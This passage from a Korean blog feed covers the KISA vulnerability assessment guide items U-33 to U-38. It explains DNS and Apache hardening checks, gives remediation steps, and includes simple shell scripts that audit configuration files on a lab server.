</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Version=`named -v`</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-33 [DNS 보안 버전 패치]<span class="string">&quot;\n&quot;</span>BIND 버전 : <span class="string">&quot;<span class="variable">$Version</span>&quot;</span> | tee /root/result/u-33.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>BIND</code> 버전을 확인해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-33</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-33/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-34 DNS Zone Transfer 설정</title>
    <url>/2022/01/16/2022-01-16-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-34%20DNS%20Zone%20Transfer%20%EC%84%A4%EC%A0%95/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>Secondary Name Server</code>로만 <code>Zone</code> 정보 전송 제한 여부 점검입니다.</p>
<p>항목코드는 <code>U-34</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<h2 id="DNS-Zone-Transfer"><a href="#DNS-Zone-Transfer" class="headerlink" title="DNS Zone Transfer?"></a>DNS Zone Transfer?</h2><br>

<p>Primary Name Server와 Secondary Name Server 간에 Zone 정보를 일관성 있게 유지하기 위하여 사용하는 기능입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>허가되지 않는 사용자에게 <code>Zone Transfer</code>를 제한함으로써 호스트 정보, 시스템 정보 등 정보 유출의 방지를 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>비인가자 <code>Zone Transfer</code>를 이용해 <code>Zone</code> 정보를 전송받아 호스트 정보, 시스템 정보, 네트워크 구성 형태 등의 많은 정보를 파악할 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : <code>DNS</code> 서비스 미사용 또는 <code>Zone Transfer</code>를 허가된 사용자에게만 허용한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : <code>DNS</code> 서비스를 사용하며 <code>Zone Transfer</code>를 모든 사용자에게 허용한 경우</p>
</blockquote>
<br>

<p><strong>&lt; DNS 서비스를 사용할 경우 &gt;</strong></p>
<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>DNS</code> 서비스 사용 시 <code>/etc/named.conf</code> 파일의 <code>allow-transfer</code> 및 <code>xfmets</code> 확인<br />    <code># ps -ef | grep named | grep -v &quot;grep&quot;</code><br />    <code># cat /etc/named.conf | grep &#39;allow-transfer&#39;</code><br />    <code># cat /etc/named.boot | grep &quot;xfrnets&quot;</code></td>
</tr>
</tbody></table>
<br>

<br>

<p><strong>&lt; DNS 서비스를 사용하지 않는 경우 &gt;</strong></p>
<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX<br />SOLARIS 5.9<br />이하 버전</td>
<td><code>DNS</code> 서비스 데몬 확인<br />    <code># ps -ef | grep named</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td><code># svcs -a | egrep &quot;dns&quot;</code></td>
</tr>
</tbody></table>
<br>

<blockquote>
<p># ps -ef | grep named | grep -v &quot;grep&quot;</p>
</blockquote>
<br>

<p><code>DNS</code> 서비스 데몬을 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-34/ps.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>LINUX, AIX,<br />HP-UX<br />SOLARIS 5.9<br />이하 버전</td>
<td><code>DNS</code> 서비스 데몬 중지<br />    <code># kill -9 [PID]</code></td>
</tr>
<tr>
<td>SOLARIS 5.10<br />이상 버전</td>
<td>1) <code>DNS</code> 서비스 데몬 확인<br />    <code>enabled 16:22:31 svc:/network/dns/server:default</code><br /><br />2) <code>svcadm disable &quot;중지하고자 하는 데몬&quot;</code> 명령으로 서비스 데몬 중지<br />    <code># svcadm disable svc:/network/dns/server:default</code></td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line">cf=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`ps -ef | grep named | grep -v <span class="string">&quot;grep&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=O</span><br><span class="line">        process=`cat /etc/named.conf | grep <span class="string">&#x27;allow-transfer&#x27;</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                cf=설정됨</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                cf=설정안됨</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">        process=`cat /etc/named.conf | grep <span class="string">&quot;xfrnets&quot;</span>`</span><br><span class="line">        <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                cf2=설정됨</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                cf2=설정안됨</span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=X</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-34 [DNS Zone Transfer 설정]<span class="string">&quot;\n&quot;</span>DNS 서비스 활성화 여부 : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span><span class="string">&quot;\n&quot;</span>allow-transfer 설정 여부 : <span class="string">&quot;<span class="variable">$cf</span>&quot;</span><span class="string">&quot;\n&quot;</span>xfrnets 설정 여부 : <span class="string">&quot;<span class="variable">$cf2</span>&quot;</span> | tee /root/result/u-34.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>DNS</code> 서비스 데몬을 확인해주고 <code>allow-transfer</code> <code>xfrnets</code> 설정이 되어있는지 확인해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-34</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-34/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-35 웹서비스 디렉토리 리스팅 제거</title>
    <url>/2022/01/16/2022-01-16-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-35%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC%20%EB%A6%AC%EC%8A%A4%ED%8C%85%20%EC%A0%9C%EA%B1%B0/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>디렉터리 검색 기능의 활성화 여부 점검입니다.</p>
<p>항목코드는 <code>U-35</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>외부에서 디렉터리 내의 모든 파일에 대한 접근 및 열람을 제한함을 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>디렉터리 검색 기능이 활성화 되어 있을 경우 사용자에게 디렉터리내 파일이 표시되어 WEB 서버 구조 노출뿐만 아니라 백업 파일이나 소스파일, 공개되어서는 안되는 파일 등이 노출 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 디렉터리 검색 기능을 사용하지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 디렉터리 검색 기능을 사용하는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>Indexes</code> 옵션 사용 여부 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;Options Indexes&quot;</p>
</blockquote>
<br>

<p><code>Indexes</code> 옵션이 설정되어 있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-35/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/[Apache_home]/conf/httpd.conf</code> 파일 열기<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br /><br />2) 설정된 모든 디렉터리의 <code>Options</code> 지시자에서 <code>Indexes</code> 옵션 제거<br />    (수정 전) <code>Options</code> 지시자에 <code>Indexes</code> 옵션이 설정되어 있음<br />    <img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-35/vi.png"><br />    (수정 후) <code>Options</code> 지시자에 <code>Indexes</code> 삭제 또는 <code>-Indexes</code> 변경 후 저장</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;Options Indexes&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-35 [웹서비스 디렉토리 리스팅 제거] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-35.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>Options</code> 지시자에 <code>Indexes</code> 옵션이 있는지 확인해줍니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-35</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-35/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-36 웹서비스 웹 프로세스 권한 제한</title>
    <url>/2022/01/17/2022-01-17-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-36%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EC%9B%B9%20%ED%94%84%EB%A1%9C%EC%84%B8%EC%8A%A4%20%EA%B6%8C%ED%95%9C%20%EC%A0%9C%ED%95%9C/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>Apache 데몬이 root 권한으로 구동되는지 여부 점검입니다.</p>
<p>항목코드는 <code>U-36</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>Apache 데몬을 root 권한으로 구동하지 않고 별도의 권한으로 구동하므로써 침해사고 발생시 피해범위 확산 방지를 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>웹서비스 데몬을 root 권한으로 실행시 파일을 생성, 수정하는 과정에서 웹서비스에 해당하지 않는 파일도 root 권한에 의해 쓰기가 가능하면 해킹 발생시 root 권한이 노출 될 수 있습니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : Apache 데몬이 root 권한으로 구동되지 않는 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : Apahce 데몬이 root 권한으로 구동되는 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>Apache 데몬 구동 권한(User 및 Group) 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br />    <code>User (root가 아닌 별도 계정명)</code><br />    <code>Group (root가 아닌 별도 계정명)</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;User &quot;</p>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;Group &quot;</p>
</blockquote>
<br>

<p><code>User</code>와 <code>Group</code>에서 root 계정명인지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-36/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) 데몬 <code>User</code> &amp; <code>Group</code> 변경<br />    <code>User</code> &amp; <code>Group</code> 부분에 root가 아닌 별도 계정으로 변경<br /><br />2) Apache 서비스 재시작</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;User &quot;</span>`</span><br><span class="line">process2=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;Group &quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *root* ]] || [[ <span class="string">&quot;<span class="variable">$process2</span>&quot;</span> == *root* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-36 [웹서비스 웹 프로세스 권한 제한] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-36.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>User</code>와 <code>Group</code> 계정이 root 계정인지 확인하고 맞으면 <code>취약</code> 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-36</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-36/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-37 웹서비스 상위 디렉토리 접근 금지</title>
    <url>/2022/01/17/2022-01-17-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-37%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EC%83%81%EC%9C%84%20%EB%94%94%EB%A0%89%ED%86%A0%EB%A6%AC%20%EC%A0%91%EA%B7%BC%20%EA%B8%88%EC%A7%80/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p><code>..</code> 와 같은 문자 사용 등으로 상위 경로로 이동 가능 여부 점검입니다.</p>
<p>항목코드는 <code>U-37</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🔔-점검-목적"><a href="#🔔-점검-목적" class="headerlink" title="🔔 점검 목적"></a>🔔 점검 목적</h1><br>

<p>상위 경로 이동 명령으로 비인가자의 특정 디렉터리에 대한 접근 및 열람을 제한하여 중요 파일 및 데이터 보호를 목적으로 합니다.</p>
<br>

<br>

<h2 id="보안위협"><a href="#보안위협" class="headerlink" title="보안위협"></a>보안위협</h2><br>

<p>상위 경로로 이동하는 것이 가능할 경우 접근하고자 하는 디렉터리의 하위 경로에 접속하여 상위경로로 이동함으로써 악의적인 목적을 가진 사용자의 접근이 가능합니다.</p>
<br>

<br>

<hr>
<br>

<h1 id="🤔-점검-방법"><a href="#🤔-점검-방법" class="headerlink" title="🤔 점검 방법"></a>🤔 점검 방법</h1><br>

<p>환경 구성 후 테스트 해보았습니다.</p>
<blockquote>
<p>버전 정보 : CentOS Linux release 7.8.2003 (Core)</p>
</blockquote>
<br>

<br>

<table>
<thead>
<tr>
<th>취약한 서버</th>
</tr>
</thead>
<tbody><tr>
<td>192.168.219.103</td>
</tr>
</tbody></table>
<br>

<br>

<h2 id="OS별-점검-파일-위치-및-점검-방법"><a href="#OS별-점검-파일-위치-및-점검-방법" class="headerlink" title="OS별 점검 파일 위치 및 점검 방법"></a>OS별 점검 파일 위치 및 점검 방법</h2><br>

<blockquote>
<p><strong>양호</strong> : 상위 디렉터리에 이동제한을 설정한 경우</p>
</blockquote>
<blockquote>
<p><strong>취약</strong> : 상위 디렉터리에 이동제한을 설정하지 않은 경우</p>
</blockquote>
<br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td><code>AllowOverride</code> 지시자 <code>Authconfig</code> 옵션 확인<br />    <code># vi /[Apache_home]/conf/httpd.conf</code></td>
</tr>
</tbody></table>
<br>

<br>

<blockquote>
<p># cat /etc/httpd/conf/httpd.conf | grep &quot;AllowOverride&quot;</p>
</blockquote>
<br>

<p><code>AllowOverride</code> 옵션이 <code>None</code>으로 설정되있는지 확인해주었습니다.</p>
<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-37/cat.png">

<br>

<br>

<hr>
<br>

<h1 id="🔒-조치방법"><a href="#🔒-조치방법" class="headerlink" title="🔒 조치방법"></a>🔒 조치방법</h1><br>

<table>
<thead>
<tr>
<th>OS</th>
<th>파일 위치 및 점검 방법</th>
</tr>
</thead>
<tbody><tr>
<td>SOLARIS,<br />LINUX, AIX,<br />HP-UX</td>
<td>1) vi 편집기를 이용하여 <code>/[Apache_home]/conf/httpd.conf</code> 파일 열기<br />    <code># vi /[Apache_home]/conf/httpd.conf</code><br /><br />2) 설정된 모든 디렉터리의 <code>AllowOverride</code> 지시자에서 <code>AuthConfig</code> 옵션 설정<br /><br />3) 사용자 인증을 설정할 디렉터리에 <code>.htaccess</code> 파일 생성<br /><br />4) 사용자 인증에 사용할 아이디 및 패스워드 생성<br /><br />5) 변경된 설정 내용을 적용하기 위하여 Apache 데몬 재시작</td>
</tr>
</tbody></table>
<br>

<br>

<hr>
<br>

<h1 id="📄-스크립트"><a href="#📄-스크립트" class="headerlink" title="📄 스크립트"></a>📄 스크립트</h1><br>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ProcessResult=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">process=`cat /etc/httpd/conf/httpd.conf | grep <span class="string">&quot;AllowOverride&quot;</span>`</span><br><span class="line"><span class="keyword">if</span> [[ <span class="string">&quot;<span class="variable">$process</span>&quot;</span> == *None* ]]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">        ProcessResult=취약</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        ProcessResult=양호</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -e U-37 [웹서비스 상위 디렉토리 접근 금지] : <span class="string">&quot;<span class="variable">$ProcessResult</span>&quot;</span> | tee /root/result/u-37.txt</span><br></pre></td></tr></table></figure>

<br>

<p><code>None</code>이라는 문자가 포함되어 있으면 <code>취약</code> 아니면 <code>양호</code>처리 했습니다.</p>
<br>

<p>해당 스크립트를 실행시키면 결과를 터미널에 출력하고, <code>/root/result/u-37</code> 파일에 결과가 저장되도록 만들었습니다.</p>
<br>

<br>

<img src="/images/주요정보통신기반시설 취약점 진단 가이드/U-37/script.png">

<br>

<br>

<hr>
<div class="link-grid"><div class="link-grid-container">
<object class="link-grid-image" data="/images/주요정보통신기반시설 취약점 진단 가이드/U-19/logo.png"></object>
<p>주요정보통신기반시설 취약점 진단 가이드 2021</p><p>KISA</p>
<a href="https://www.kisa.or.kr/public/laws/laws3_View.jsp?cPage=1&mode=view&p_No=259&b_No=259&d_No=106&ST=T&SV="></a>
</div></div>
]]></content>
      <categories>
        <category>주요정보통신기반시설 취약점 진단 가이드</category>
      </categories>
      <tags>
        <tag>시스템보안</tag>
        <tag>주요정보통신기반시설 취약점 진단 가이드</tag>
        <tag>UNIX/LINUX</tag>
      </tags>
  </entry>
  <entry>
    <title>[주요정보통신기반시설 취약점 진단 가이드] U-38 웹서비스 불필요한 파일 제거</title>
    <url>/2022/01/17/2022-01-17-%5B%EC%A3%BC%EC%9A%94%EC%A0%95%EB%B3%B4%ED%86%B5%EC%8B%A0%EA%B8%B0%EB%B0%98%EC%8B%9C%EC%84%A4%20%EC%B7%A8%EC%95%BD%EC%A0%90%20%EC%A7%84%EB%8B%A8%20%EA%B0%80%EC%9D%B4%EB%93%9C%5D%20U-38%20%EC%9B%B9%EC%84%9C%EB%B9%84%EC%8A%A4%20%EB%B6%88%ED%95%84%EC%9A%94%ED%95%9C%20%ED%8C%8C%EC%9D%BC%20%EC%A0%9C%EA%B1%B0/</url>
    <content><![CDATA[<h1 id="🔎-점검내용"><a href="#🔎-점검내용" class="headerlink" title="🔎  점검내용"></a>🔎  점검내용</h1><br>

<p>Apache 설치 시 기본적으로 생성되는 불필요한 파일의 삭제 여부 점검입니다.</p>
<p>항목코드는 <code>U-38</code>이며, 항목 주요도는 <code>상</code>입니다.</p>
<br>

<br>

<hr>
<br>

